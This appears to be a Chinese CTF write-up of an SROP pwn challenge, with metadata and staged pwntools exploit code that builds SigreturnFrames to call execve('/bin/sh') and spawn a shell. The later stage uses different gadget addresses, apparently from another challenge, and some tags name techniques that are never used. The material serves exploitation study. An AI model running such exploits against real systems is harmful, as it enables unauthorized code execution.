---
title: 一道 SROP 漏洞利用的 Pwn 题
contest: 个人赛
year: 2022
difficulty: medium
vuln_type: rop
tags: [SROP-Sigreturn-Oriented-Programming, SigreturnFrame, syscall-rax-15, pwntools-frame, mprotect-RWX, ret2csu, Oakland-2014]
attack_chain: 1. read+write 泄露 /bin/sh 地址 (recv 8 字节 - 280 偏移) /2. 构造 SigreturnFrame: rax=59 SYS_execve rdi=binsh_addr rsi=0 rdx=0 rip=0x400501 syscall /3. 触发 sigreturn: rax=15 (mov rax,15) + syscall pop 所有寄存器 /4. 双 SROP 链: 第一次 rax=0 read(0, 0x402500, 0x300) + 第二次 rax=59 execve("/bin/sh", 0, 0)
key_payload: rax=15 sigreturn syscall  syscall 0x400501  binsh_addr u64 - 280
one_liner: SROP 入门 Pwn 题，通过 sigreturn 系统调用号 15 触发 SigreturnFrame 恢复寄存器 + execve("/bin/sh") 收 shell。
lesson: SROP 2014 年 Vrije Universiteit Amsterdam Erik Bosman 提出；rax=15 sigreturn 触发内核恢复所有用户态寄存器；SigreturnFrame() pwntools 一行构造。
quality: high
---

# 一道 SROP 漏洞利用的 Pwn 题

## 概览
SROP 入门 Pwn 题，2014 年由 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，发表在 Oakland 2014 Best Student Papers。

## 注意点
1. 系统调用是内核态所做的事情
2. sigreturn 是系统调用，调用号在 64 位下为 15（没有 sigreturn 系统调用地址时，只有 rax=15 且具有 syscall 才能进行 sigreturn 系统调用）
3. 写 exp 时需设 context.arch = "amd64"

## 攻击链

### Stage 1: 泄露 /bin/sh 地址
```python
payload = "/bin/sh\x00"
payload = payload.ljust(0x10, "\x00") + p64(0x4004ed)
p.send(payload)
p.recv(0x20)
binsh_addr = u64(p.recv(8)) - 280
print "binsh_addr = " + hex(binsh_addr)
```

### Stage 2: 构造 SigreturnFrame
```python
frame = SigreturnFrame()
frame.rax = 59  # SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x400501  # syscall

payload = "/bin/sh\x00" + p64(0) + p64(0x4004DA) + p64(0x400501) + str(frame)
# 0x4004DA = mov rax, 15
p.send(payload)
```

### Stage 3: 双 SROP 链（仅 read 系统调用）
```python
# 第一次 frame: rax=0 read(0, 0x402500, 0x300)
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x402500
frame.rdx = 0x300
frame.rip = 0x40102B  # syscall
frame.rsp = 0x402500
frame.rbp = 0x402500

payload = "a"*0x18 + p64(vuln) + p64(0x40102B) + str(frame)
p.send(payload)
p.sendline("a"*14)  # rax=15 触发 sigreturn

# 第二次 frame: rax=59 execve
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x402500
frame.rip = 0x40102B
frame.rsi = 0
frame.rdx = 0

payload = "\x00"*8 + p64(vuln) + p64(0x40102b) + str(frame)
p.sendline(payload)
p.send("q"*8 + "/bin/sh")
p.interactive()
```

## 经验提炼
- SROP 2014 年 Vrije Universiteit Amsterdam Erik Bosman 提出
- rax=15 sigreturn 触发内核恢复所有用户态寄存器
- SigreturnFrame() pwntools 一行构造
- 64 位 syscall 调用号：read=0, write=1, open=2, mmap=9, execve=59, sigreturn=15
- 0x400501 syscall gadget 必备
- 0x4004DA mov rax, 15 gadget 必备
- 双 SROP 链：先 read 写新 payload，再 execve 收 shell
- `/bin/sh\x00` 字符串填充到 0x10 字节
- 280 偏移 = 程序启动时栈地址与 /bin/sh 字符串位置之差
- 0x402500 是固定 BSS 段地址，作为 read 目标
